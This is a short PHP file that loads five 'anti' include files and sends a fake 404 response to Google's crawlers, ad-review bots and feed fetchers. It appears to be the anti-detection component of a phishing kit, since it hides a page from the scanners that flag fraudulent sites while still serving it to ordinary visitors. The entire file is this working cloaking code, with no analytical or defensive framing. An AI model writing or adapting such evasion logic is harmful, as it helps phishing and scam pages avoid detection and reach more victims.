<?php
$useragent = $_SERVER['HTTP_USER_AGENT'];
include("./anti0.php");
include("./anti1.php");
include("./anti2.php");
include("./anti3.php");
include("./anti4.php");
if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot")){
    header("HTTP/1.0 404 Not Found");
    exit();
}else if(strval($useragent) == "APIs-Google (+https://developers.google.com/webmasters/APIs-Google.html)"){
    header("HTTP/1.0 404 Not Found");
    exit();
}else if(strval($useragent) == "Mediapartners-Google"){
    header("HTTP/1.0 404 Not Found");
    exit();
}else if(strpos($useragent, 'AdsBot-Google')){
    header("HTTP/1.0 404 Not Found");
    exit();
}else if(strpos($useragent, 'adsbot.html')){
    header("HTTP/1.0 404 Not Found");
    exit();
}else if(strpos($useragent, 'Googlebot')){
    header("HTTP/1.0 404 Not Found");
    exit();
}else if(strpos($useragent, 'FeedFetcher')){
    header("HTTP/1.0 404 Not Found");
    exit();
}else if(strpos($useragent, 'bot.html')){
    header("HTTP/1.0 404 Not Found");
    exit();
}